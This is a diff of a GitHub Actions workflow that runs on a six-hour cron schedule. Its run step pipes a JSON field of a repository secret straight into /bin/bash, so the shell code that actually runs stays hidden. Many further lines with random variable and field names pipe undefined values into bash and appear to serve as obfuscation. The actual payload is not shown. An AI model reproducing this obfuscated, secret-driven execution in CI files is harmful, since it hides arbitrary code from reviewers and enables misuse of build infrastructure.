@@ -1,28 +1,32 @@
 name: changtaizhu1234
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 3/6 * * *'
-
+    - cron: '40 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: changtaizhu1234
         env:
-          oa1: ${{ secrets.oa1 }}
+          yp0: ${{ secrets.yp0 }}
         run: |
-          echo $oa1 | jq -r .zyhel8883 | /bin/bash
-          echo $km42709 | jq -r .gydz3 | /bin/bash
-          echo $tnban7 | jq -r .qpoff8 | /bin/bash
-          echo $cdqbq6287 | jq -r .w16 | /bin/bash
-          echo $nzu999 | jq -r .vu15533 | /bin/bash
-          echo $x44926 | jq -r .z4 | /bin/bash
-          echo $lzuzp176 | jq -r .dmv1 | /bin/bash
-          echo $tyi7457 | jq -r .trey78202 | /bin/bash
-          echo $a1 | jq -r .rrtk6472 | /bin/bash
-          echo $xww39707 | jq -r .wzp54900 | /bin/bash
-          echo $yhl52875 | jq -r .wqb9 | /bin/bash
+          echo $yp0 | jq -r .hy4118 | /bin/bash
+          echo $fgx966 | jq -r .ffct3937 | /bin/bash
+          echo $dur469 | jq -r .fcdq97847 | /bin/bash
+          echo $rsrlv165 | jq -r .bb10084 | /bin/bash
+          echo $uen6 | jq -r .hxo308 | /bin/bash
+          echo $yl064 | jq -r .l9 | /bin/bash
+          echo $aupu1742 | jq -r .flofq7823 | /bin/bash
+          echo $niig3 | jq -r .gwdk060 | /bin/bash
+          echo $luofl77113 | jq -r .f09 | /bin/bash
+          echo $iunn6469 | jq -r .n16823 | /bin/bash
+          echo $yg3 | jq -r .zue65 | /bin/bash
+          echo $f5577 | jq -r .dxc5119 | /bin/bash
+          echo $edcx8452 | jq -r .smzj9492 | /bin/bash
+          echo $uuzq15357 | jq -r .y2792 | /bin/bash
+          echo $k995 | jq -r .p3 | /bin/bash
+          echo $bymq960 | jq -r .pup2 | /bin/bash
 
